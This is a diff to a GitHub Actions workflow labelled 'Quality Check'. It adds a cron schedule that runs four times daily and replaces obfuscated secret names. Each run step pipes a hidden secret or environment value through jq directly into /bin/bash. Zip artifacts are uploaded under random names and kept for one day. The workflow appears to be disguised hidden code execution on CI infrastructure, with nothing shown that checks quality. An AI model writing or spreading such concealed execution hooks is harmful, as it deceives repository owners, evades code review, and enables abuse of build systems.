@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '32 4,10,16,22 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,19 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Invoke
         env:
-          u60: ${{ secrets.u60 }}
+          c20434: ${{ secrets.c20434 }}
         run: |
-          printf '%s' "$u60" | jq -r .wvew88255 | /bin/bash
-          echo $x05250 | jq -r .mpa12 | /bin/bash
-          echo $iw4 | jq -r .kpc58 | /bin/bash
-          echo $keapr5 | jq -r .u9 | /bin/bash
-          echo $va0 | jq -r .g8 | /bin/bash
-          echo $ygd3013 | jq -r .k22 | /bin/bash
-          echo $to0737 | jq -r .tgt5176 | /bin/bash
+          printf '%s' "$c20434" | jq -r .l2598 | /bin/bash
+          printf '%s' "$ihs77996" | jq -r .ptgwf695 | /bin/bash
+          printf '%s' "$nlkwv9308" | jq -r .ccdtn1 | /bin/bash
+          printf '%s' "$vmzhn27" | jq -r .uukxp83 | /bin/bash
+          printf '%s' "$wg6359" | jq -r .sdg2 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
         with:
-          name: icpO2vC3
+          name: UgtdgzfD
           path: "*.zip"
           retention-days: 1
